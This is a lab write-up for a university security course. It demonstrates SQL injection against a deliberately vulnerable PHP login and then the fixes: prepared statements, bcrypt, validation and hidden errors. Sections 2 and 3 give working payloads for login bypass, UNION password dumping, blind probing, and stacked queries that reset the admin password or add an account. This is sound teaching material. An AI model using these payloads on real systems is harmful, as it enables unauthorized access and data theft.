# SECURITY.md — SQL Injection: Attack and Defense Analysis

**Course:** System and Network Security (CS5.470)
**Lab:** Assignment 5 | IIIT Hyderabad

---

## 1. How SQL Injection Works

SQL Injection (SQLi) is a code injection technique where an attacker inserts or "injects" malicious SQL statements into an input field that is directly concatenated into a database query.

**Root Cause:** Mixing user-controlled data with SQL command syntax without proper separation.

**Vulnerable pattern:**
```php
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

When a user types `' OR '1'='1' -- ` as username, the query becomes:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='...'
```
The `-- ` comments out the rest of the query. Since `'1'='1'` is always true, the WHERE clause matches **every row** in the table — bypassing authentication entirely.

---

## 2. Types of Attacks Performed

### 2.1 Authentication Bypass
**Payload:**
- Username: `' OR '1'='1' -- `
- Password: `anything`

**Resulting Query:**
```sql
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='anything'
```

**Effect:** The condition `'1'='1'` is always true, so the query returns all rows. Since `mysqli_num_rows() > 0`, the application grants access without valid credentials.

---

### 2.2 UNION-Based Injection
**Payload:**
- Username: `' UNION SELECT id, username, password FROM users -- `

**Resulting Query:**
```sql
SELECT * FROM users WHERE username='' UNION SELECT id, username, password FROM users -- ' AND password='...'
```

**Effect:** The UNION operator appends a second SELECT statement. Its results are merged with the first query's output, effectively **dumping all usernames and passwords** from the database to the response page.

---

### 2.3 Blind SQL Injection
Blind SQLi is used when the application does not display query results directly, but its **behavior** (login success/failure) reveals information.

**True condition:** `admin' AND 1=1 -- `
```sql
SELECT * FROM users WHERE username='admin' AND 1=1 -- '
```
→ 1=1 is always true → **Login succeeds** (admin exists)

**False condition:** `admin' AND 1=2 -- `
```sql
SELECT * FROM users WHERE username='admin' AND 1=2 -- '
```
→ 1=2 is always false → **Login fails**

By systematically varying conditions (e.g., `AND SUBSTRING(password,1,1)='a'`), an attacker can enumerate database contents character by character — without ever directly seeing the data.

---

### 2.4 Database Modification Attacks (Stacked Queries)

The vulnerable application uses `mysqli_multi_query()`, allowing multiple SQL statements separated by semicolons.

#### 2.4.1 Change admin password
**Payload:**
- Username: `'; UPDATE users SET password='hacked' WHERE username='admin' -- `

**Resulting Query:**
```sql
SELECT * FROM users WHERE username=''; UPDATE users SET password='hacked' WHERE username='admin' -- ' AND password='...'
```

**Effect:** The first statement returns nothing; the second **modifies** the admin's password in the database. If you then try to log in as `admin` with `admin123`, it will fail. Logging in with `hacked` will succeed.

#### 2.4.2 Insert a new user
**Payload:**
- Username: `'; INSERT INTO users (username, password) VALUES ('attacker','evil') -- `

**Resulting Query:**
```sql
SELECT * FROM users WHERE username=''; INSERT INTO users (username, password) VALUES ('attacker','evil') -- '...
```

**Effect:** Creates a new account `attacker / evil` without any authorization. The attacker can now log in as this user.

---

## 3. How Attacks Modified the Database

| Attack | SQL Operation | Table Affected | Effect |
|--------|--------------|----------------|--------|
| Change password | `UPDATE users SET password=...` | `users` | admin password permanently changed |
| Insert user | `INSERT INTO users ...` | `users` | Unauthorized account created |

These modifications persist in the database until manually reverted. To restore, run:
```sql
USE lab5;
UPDATE users SET password='admin123' WHERE username='admin';
DELETE FROM users WHERE username='attacker';
```

---

## 4. How the Fixes Prevent Attacks

### Fix 1: Prepared Statements (Parameterized Queries)

```php
// VULNERABLE
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
mysqli_query($conn, $sql);

// SECURE
$stmt = mysqli_prepare($conn, "SELECT * FROM users WHERE username = ?");
mysqli_stmt_bind_param($stmt, "s", $username);
mysqli_stmt_execute($stmt);
```

**Why it works:** The SQL structure is compiled **before** the user input is added. The database treats `?` as a pure data value — no matter what the user types (even `' OR '1'='1'`), it is treated as a literal string, never as SQL syntax. UNION injection also fails because the structural query is fixed at compile time.

---

### Fix 2: Password Hashing (bcrypt)

```php
// VULNERABLE (plaintext comparison)
$sql = "... AND password='$password'";

// SECURE (hash stored; verified at runtime)
$hash = password_hash($plaintext, PASSWORD_BCRYPT);  // At registration/setup
password_verify($userInput, $storedHash);             // At login
```

**Why it works:**
- Even if an attacker dumps the database, they get bcrypt hashes, not plaintext passwords
- `password_verify()` is timing-attack resistant
- UNION injection cannot forge a bcrypt-valid hash to bypass this check

---

### Fix 3: Input Validation

```php
if (strlen($username) > 50 || !preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    header("Location: index.php?error=1");
    exit;
}
```

**Why it works:** SQL injection payloads contain special characters like `'`, `-`, `;`, spaces, and `=`. The regex whitelist rejects any input containing those characters before it ever reaches a query.

---

### Fix 4: No SQL Error Exposure

```php
// VULNERABLE — exposes internal DB structure
echo "Error: " . mysqli_error($conn);

// SECURE — errors go to server log only
error_log("DB error: " . mysqli_error($conn));
// User sees only a generic message
```

**Why it works:** Error-based SQL injection relies on MySQL error messages to extract schema information. Hiding these removes a crucial feedback channel for attackers.

---

### Fix 5: No Multi-Statement Execution

The secure app uses `mysqli_prepare()` which inherently supports only **one statement** per call. Stacked queries with `;` are silently ignored, preventing all database modification attacks.

---

### Fix 6: Output Escaping

```php
echo htmlspecialchars($username);
```

Prevents stored/reflected XSS attacks that could accompany SQLi exploits.

---

## 5. Summary Table

| Attack | Vulnerable App | Secure App |
|--------|---------------|------------|
| Auth bypass (`OR 1=1`) | ✅ Succeeds | ❌ Blocked by prepared statement |
| UNION data extraction | ✅ Succeeds | ❌ Blocked — query structure is fixed |
| Blind SQL probing | ✅ Succeeds | ❌ Blocked — no SQL executed with user data directly |
| Password modification | ✅ Succeeds | ❌ Blocked — single statement only |
| New user insertion | ✅ Succeeds | ❌ Blocked — single statement only |
| Error-based leakage | ✅ Visible | ❌ Hidden — logged server-side only |

---

*This document is for educational purposes only. Performing SQL injection attacks against systems without explicit permission is illegal.*
